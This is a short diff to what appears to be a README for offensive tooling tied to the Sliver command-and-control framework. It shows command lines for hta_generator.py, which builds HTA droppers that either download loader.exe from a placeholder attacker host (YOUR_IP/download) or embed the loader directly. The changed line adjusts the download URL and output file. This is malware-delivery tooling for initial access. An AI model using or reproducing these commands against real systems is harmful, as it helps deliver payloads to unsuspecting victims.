@@ -333,7 +333,7 @@ For Sliver questions:
 ./hta_generator.py
 
 # Download method
-./hta_generator.py -m 1 -H YOUR_IP -f loader.exe
+./hta_generator.py -m 1 -H YOUR_IP/download -f loader.exe -o download.hta
 
 # Embedded method
 ./hta_generator.py -m 2 -l ./loader.exe
